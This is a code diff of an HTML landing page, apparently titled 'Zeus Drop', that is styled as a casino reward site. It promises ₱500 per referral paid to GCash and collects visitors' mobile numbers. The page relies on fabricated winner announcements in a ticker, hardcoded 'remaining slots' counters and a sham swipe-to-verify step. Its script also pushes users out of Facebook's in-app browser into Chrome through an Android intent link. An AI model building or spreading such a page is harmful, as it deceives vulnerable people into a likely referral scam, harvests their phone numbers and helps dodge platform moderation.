@@ -2,266 +2,212 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Lucky Drop | Divine Casino Rewards</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Zeus Drop | Divine Rewards</title>
     
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Forum&family=Orbitron:wght@600;700;800;900&family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;600;700;800;900&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Forum&display=swap" rel="stylesheet">
     
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <!-- External CSS -->
     <link rel="stylesheet" href="styles/instyle.css">
 </head>
 <body>
 
+    <!-- ====== BACKGROUND LAYERS ====== -->
+    <!-- Main gradient overlay -->
     <div class="bg-gradient"></div>
-    <div class="bg-glow"></div>
-    <div class="bg-zeus"></div>
-    <div class="marble-texture"></div>
-    <canvas id="particleCanvas"></canvas>
-    <div class="lightning-flash"></div>
     
+    <!-- Divine glow effect -->
+    <div class="bg-glow"></div>
+    
+    <!-- Zeus Background Image (VISIBLE) -->
+    <div class="bg-zeus"></div>
+    
+    <!-- Marble Texture Overlay -->
+    <div class="marble-texture"></div>
+    
+    <!-- Divine Particles (Golden Sparks) -->
     <div class="divine-particles">
-        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
-        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
-        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
-        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
     </div>
+    
+    <!-- Lightning Flash Effect -->
+    <div class="lightning-flash"></div>
 
+    <!-- Live Winners Ticker -->
     <div class="live-ticker">
-        <div class="ticker-badge">LIVE</div>
         <div class="ticker-dot"></div>
         <div class="ticker-content">
-            <div class="ticker-text" id="tickerText">
-                ⚡ DIVINE DROP: Claim your epic rewards before March 20, 2026! Powered by FreeShoppingPH ⚡
-            </div>
+            <span class="ticker-text" id="winnerEntry">⚡ 0917***4256 completed task +₱500</span>
         </div>
+        <div class="ticker-badge">DIVINE</div>
     </div>
 
-    <div class="main-card">
-        <div class="corner-deco tl">Ω</div>
-        <div class="corner-deco tr">Ω</div>
-        <div class="corner-deco bl">Ω</div>
-        <div class="corner-deco br">Ω</div>
-
+    <!-- Main Card -->
+    <div class="main-card" id="mainCard">
+        <!-- Greek Corner Decorations -->
+        <span class="corner-deco tl">Ω</span>
+        <span class="corner-deco tr">Ω</span>
+        <span class="corner-deco bl">Ω</span>
+        <span class="corner-deco br">Ω</span>
+        
         <div class="logo-area">
             <div class="logo-icon">
-                <i class="fa-solid fa-bolt-lightning"></i>
+                <i class="fas fa-bolt"></i>
             </div>
             <h1 class="logo-text">ZEUS DROP</h1>
-            <div class="logo-sub">Divine Casino Rewards</div>
+            <div class="logo-sub">⚡ Mount Olympus ⚡</div>
         </div>
 
-        <div class="bonus-box-premium">
-            <div class="bonus-glow"></div>
-            <div class="bonus-shine"></div>
-            <div class="bonus-amount-premium">₱50,000</div>
-            <div class="bonus-label-premium">Godly Welcome Bonus</div>
-        </div>
-
+        <!-- Value Props -->
         <div class="value-props">
             <div class="prop-row">
-                <div class="prop-icon"><i class="fa-solid fa-crown"></i></div>
+                <div class="prop-icon"><i class="fas fa-bolt"></i></div>
                 <div>
-                    <div class="prop-title">INSTANT VIP STATUS</div>
-                    <div class="prop-desc">Ascend to Mount Olympus instantly.</div>
+                    <div class="prop-title">Divine Tasks</div>
+                    <div class="prop-desc">Complete simple tasks & earn blessings</div>
                 </div>
             </div>
             <div class="prop-row">
-                <div class="prop-icon"><i class="fa-solid fa-bolt"></i></div>
+                <div class="prop-icon"><i class="fas fa-coins"></i></div>
                 <div>
-                    <div class="prop-title">LIGHTNING FAST WITHDRAWALS</div>
-                    <div class="prop-desc">Powered by divine speed.</div>
+                    <div class="prop-title">Golden Rewards</div>
+                    <div class="prop-desc">₱500 per successful referral</div>
+                </div>
+            </div>
+            <div class="prop-row">
+                <div class="prop-icon"><i class="fas fa-wallet"></i></div>
+                <div>
+                    <div class="prop-title">GCash Payout</div>
+                    <div class="prop-desc">Withdraw directly to your wallet</div>
                 </div>
             </div>
         </div>
 
+        <!-- Scarcity Tracker -->
         <div class="scarcity-box">
             <div class="scarcity-header">
-                <span class="scarcity-label">Remaining Drops</span>
-                <span class="scarcity-numbers">84 <span class="scarcity-total">/ 500</span></span>
+                <span class="scarcity-label">⚡ Sacred Slots</span>
+                <div><span class="scarcity-numbers" id="remNum">88</span><span class="scarcity-total">/100</span></div>
             </div>
             <div class="progress-track">
-                <div class="progress-fill" style="width: 16.8%;"></div>
+                <div class="progress-fill" id="pBar" style="width: 88%"></div>
             </div>
         </div>
 
-        <div class="input-group-premium">
-            <div class="input-label-premium">
-                <i class="fa-solid fa-mobile-screen"></i> Enter Mobile Number
-            </div>
-            <div class="input-wrapper-premium">
-                <input type="tel" placeholder="+63 9XX XXX XXXX" maxlength="13" id="userPhone">
-            </div>
-        </div>
-
+        <!-- Swipe to Verify -->
         <div class="swipe-container">
             <div class="swipe-track" id="swipeTrack">
-                <div class="swipe-fire-trail" id="swipeTrail"></div>
-                <div class="swipe-icon" id="swipeBtn">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Gold_coin_icon.png/240px-Gold_coin_icon.png" class="scatter-icon" alt="Coin">
+                <div class="swipe-fire-trail" id="swipeFireTrail"></div>
+                <div class="swipe-icon" id="swipeIcon">
+                    <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
                 </div>
-                <span class="swipe-text" id="swipeText">SWIPE TO UNLOCK</span>
+                <div class="swipe-text">⚡ SWIPE TO VERIFY ⚡</div>
             </div>
         </div>
 
-        <button class="login-btn" id="claimBtn" disabled style="opacity: 0.5; cursor: not-allowed;">
-            <span class="login-text">SUMMON REWARD</span>
-            <span class="login-dots"></span>
-        </button>
-
-        <div class="warning-text-premium">
-            <i class="fa-solid fa-shield-halved"></i>
-            <span>Secured. Device fingerprinting & signatures active to prevent duplicate registration.</span>
+        <div class="card-footer">
+            <i class="fas fa-shield-alt"></i>
+            <span>Protected by Olympus</span>
         </div>
     </div>
 
-    <div class="modal-overlay" id="successModal">
+    <!-- Modal -->
+    <div class="modal-overlay" id="modalOverlay">
         <div class="modal-container">
             <div class="modal-card">
-                <button class="modal-close" id="closeModal"><i class="fa-solid fa-xmark"></i></button>
-                <div class="modal-icon">
-                    <i class="fa-solid fa-check"></i>
+                <button class="modal-close" onclick="closeModal()">✕</button>
+                
+                <div id="modalBodyContent">
+                    <div class="modal-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h2 class="modal-title">DIVINE VERIFICATION</h2>
+                    <p class="modal-subtitle">This will be your <span class="gold-text">Oracle ID</span><br>Only the worthy shall receive Zeus's blessings</p>
+                    
+                    <div class="bonus-box-premium">
+                        <div class="bonus-glow"></div>
+                        <div class="bonus-amount-premium">₱500</div>
+                        <div class="bonus-label-premium">⚡ ZEUS'S BLESSING ⚡</div>
+                        <div class="bonus-shine"></div>
+                    </div>
+                    
+                    <div class="input-group-premium">
+                        <label class="input-label-premium">
+                            <i class="fas fa-mobile-alt"></i>
+                            Divine Number
+                        </label>
+                        <div class="input-wrapper-premium">
+                            <input type="tel" id="userPhone" placeholder="Enter 11-digit mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                        </div>
+                    </div>
+                    
+                    <button class="login-btn" id="claimBtn" onclick="processStep1()">
+                        <span class="login-text">SUMMON</span>
+                        <span class="login-dots"></span>
+                    </button>
+                    
+                    <div class="warning-text-premium">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Complete more tasks to receive divine payouts</span>
+                    </div>
                 </div>
-                <h2 class="modal-title">Divine Blessing Granted</h2>
-                <p class="modal-subtitle">Your device has been verified and your <span class="gold-text">₱50,000</span> welcome bonus is ready.</p>
-                <button class="login-btn success" style="width: 100%;" onclick="window.location.reload();">
-                    <span class="login-text">ENTER OLYMPUS</span>
-                </button>
             </div>
         </div>
     </div>
 
+    <canvas id="particleCanvas"></canvas>
+
+    <script src="js/config.js"></script>
+    <script src="js/index.js"></script>
+    
     <script>
-        // Ticker Animation
-        const tickerTexts = [
-            "⚡ DIVINE DROP: Claim your epic rewards before March 20, 2026! Powered by FreeShoppingPH ⚡",
-            "🔥 A player from Manila just summoned ₱15,000! 🔥",
-            "⚡ Only 84 Divine Drops remaining today! ⚡"
-        ];
-        let tickerIndex = 0;
-        const tickerElement = document.getElementById('tickerText');
-
-        setInterval(() => {
-            tickerElement.classList.add('fade-out');
-            setTimeout(() => {
-                tickerIndex = (tickerIndex + 1) % tickerTexts.length;
-                tickerElement.innerText = tickerTexts[tickerIndex];
-                tickerElement.classList.remove('fade-out');
-                tickerElement.classList.add('fade-in');
-            }, 300);
-            setTimeout(() => tickerElement.classList.remove('fade-in'), 600);
-        }, 4000);
-
-        // Swipe to Verify Logic
-        const swipeTrack = document.getElementById('swipeTrack');
-        const swipeBtn = document.getElementById('swipeBtn');
-        const swipeTrail = document.getElementById('swipeTrail');
-        const swipeText = document.getElementById('swipeText');
-        const claimBtn = document.getElementById('claimBtn');
-        
-        let isDragging = false;
-        let startX = 0;
-        let isVerified = false;
-
-        swipeBtn.addEventListener('mousedown', startDrag);
-        swipeBtn.addEventListener('touchstart', startDrag, {passive: true});
-
-        window.addEventListener('mousemove', drag);
-        window.addEventListener('touchmove', drag, {passive: false});
-
-        window.addEventListener('mouseup', endDrag);
-        window.addEventListener('touchend', endDrag);
-
-        function startDrag(e) {
-            if (isVerified) return;
-            isDragging = true;
-            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-            swipeTrail.classList.add('active');
-        }
-
-        function drag(e) {
-            if (!isDragging) return;
-            // Prevent scrolling while swiping
-            if(e.type.includes('touch')) e.preventDefault();
+        // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
+        (function() {
+            const existingUserPhone = localStorage.getItem("userPhone");
+            const existingDeviceId = localStorage.getItem("userDeviceId");
             
-            const currentX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-            const diffX = currentX - startX;
-            const maxDrag = swipeTrack.offsetWidth - swipeBtn.offsetWidth - 4; // 4px for border
-
-            if (diffX > 0 && diffX <= maxDrag) {
-                swipeBtn.style.left = `${diffX + 2}px`;
-                swipeTrail.style.width = `${diffX + 26}px`;
-                swipeText.style.opacity = 1 - (diffX / maxDrag);
-            } else if (diffX > maxDrag) {
-                verifySuccess();
+            if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
+                console.log('Existing user detected:', existingUserPhone);
+                console.log('Redirecting to share_and_earn.html...');
+                window.location.href = "share_and_earn.html";
             }
-        }
+        })();
 
-        function endDrag() {
-            if (!isDragging) return;
-            isDragging = false;
+        // ========== INTENT URL HANDLER ==========
+        (function() {
+            const isFacebookApp = navigator.userAgent.includes('FBAN') || 
+                                  navigator.userAgent.includes('FBAV') ||
+                                  navigator.userAgent.includes('Messenger');
             
-            if (!isVerified) {
-                // Snap back
-                swipeBtn.style.transition = 'left 0.3s ease';
-                swipeTrail.style.transition = 'width 0.3s ease';
-                swipeBtn.style.left = '2px';
-                swipeTrail.style.width = '0px';
-                swipeText.style.opacity = '1';
-                swipeTrail.classList.remove('active');
+            if (isFacebookApp && !window.location.hash.includes('redirected')) {
+                window.location.hash = 'redirected';
                 
-                setTimeout(() => {
-                    swipeBtn.style.transition = 'left 0.05s linear';
-                    swipeTrail.style.transition = 'width 0.05s linear';
-                }, 300);
+                const targetUrl = 'https://xjiligames.github.io/rewards/index.html';
+                const urlWithoutProtocol = targetUrl.replace('https://', '');
+                const intentUrl = `intent://${urlWithoutProtocol}#Intent;scheme=https;package=com.android.chrome;end`;
+                
+                window.location.href = intentUrl;
             }
-        }
-
-        function verifySuccess() {
-            isVerified = true;
-            isDragging = false;
-            
-            swipeBtn.style.left = `calc(100% - ${swipeBtn.offsetWidth + 2}px)`;
-            swipeTrail.style.width = '100%';
-            swipeText.innerText = "VERIFIED";
-            swipeText.style.opacity = '1';
-            swipeText.style.color = "#22C55E";
-            swipeText.style.textShadow = "none";
-            
-            // Enable Button
-            claimBtn.disabled = false;
-            claimBtn.style.opacity = "1";
-            claimBtn.style.cursor = "pointer";
-        }
-
-        // Button Loading State & Modal
-        const modal = document.getElementById('successModal');
-        const closeModalBtn = document.getElementById('closeModal');
-
-        claimBtn.addEventListener('click', () => {
-            if(!isVerified) return;
-            
-            claimBtn.classList.add('loading');
-            
-            // Simulate API Call / Registration logic
-            setTimeout(() => {
-                claimBtn.classList.remove('loading');
-                claimBtn.classList.add('success');
-                claimBtn.querySelector('.login-text').innerText = "GRANTED";
-                
-                // Show modal
-                setTimeout(() => {
-                    modal.style.display = 'flex';
-                }, 400);
-                
-            }, 2000);
-        });
-
-        closeModalBtn.addEventListener('click', () => {
-            modal.style.display = 'none';
-        });
+        })();
     </script>
 </body>
 </html>
